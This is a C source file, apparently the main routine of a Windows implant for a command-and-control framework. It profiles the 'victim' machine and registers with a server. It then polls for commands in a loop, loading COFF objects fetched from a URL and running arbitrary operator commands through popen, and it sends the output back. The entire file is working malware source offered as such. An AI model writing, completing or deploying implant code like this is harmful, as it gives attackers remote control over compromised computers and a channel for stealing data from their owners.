#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>

#include "Typedefs.h"

int main() {
    Command command;
    char previousCommand[256] = {0}; // Buffer to store the previous command

    Victim *victim = (Victim *)malloc(sizeof(Victim));
    if (victim == NULL) {
        return -1;
    }

    information_gatherer(victim);

    printf("Registering implant %s\n\n", victim->ID);
    registerNewImplant(victim); // Fixed the parameter here

    while(TRUE) {
        fetchCommand(&command);

        printf("Fetched %s from server...\n\n", command.Input);

        // Check if the new command is the same as the previous command
        if (strcmp(previousCommand, command.Command) != 0) {
            if (strcmp(command.Input, "coff") == 0) {
                printf("Running the COFF Loader\n");
                char url[1024]; // Make sure this buffer is large enough
                sprintf(url, "http://localhost:8000/%s", command.File);
                COFFLoader(url);
            }

            if (strcmp(command.Input, "os") == 0) {
                printf("Running OS Command\n");

                // Print the raw command for debugging
                printf("Raw Command:");
                for (int i = 0; i < sizeof(command.Command); i++) {
                    printf(" %02x", (unsigned char) command.Command[i]);
                }
                printf("\n");

                // Sanitize the command by removing any non-printable characters
                for (int i = 0; command.Command[i]; i++) {
                    if (!isprint(command.Command[i])) {
                        command.Command[i] = '\0';
                        break;
                    }
                }

                if (command.Command[0] == '\0') {
                    printf("Sanitized command is empty!\n");
                } else {
                    printf("Executing Command: %s\n", command.Command); // Print the sanitized command
                }

                char output[1024] = {0}; // Buffer to capture the output, not a pointer
                FILE *fp = popen(command.Command, "r");
                if (fp != NULL) {
                    while (fgets(output, sizeof(output) - 1, fp) != NULL) {
                        // Handle or store the output as needed
                        // For now, we'll just print it
                        printf("%s", output);
                    }
                    pclose(fp);
                }

                sendResult(command.ImplantUser, command.Operator, output);
            }


            // Save the current command as the previous command for the next iteration
            strncpy(previousCommand, command.Command, sizeof(previousCommand) - 1);
        }

        sleep(atoi(command.Delay));
    }

    free(victim); // Free the allocated memory for the victim
    return 0;
}
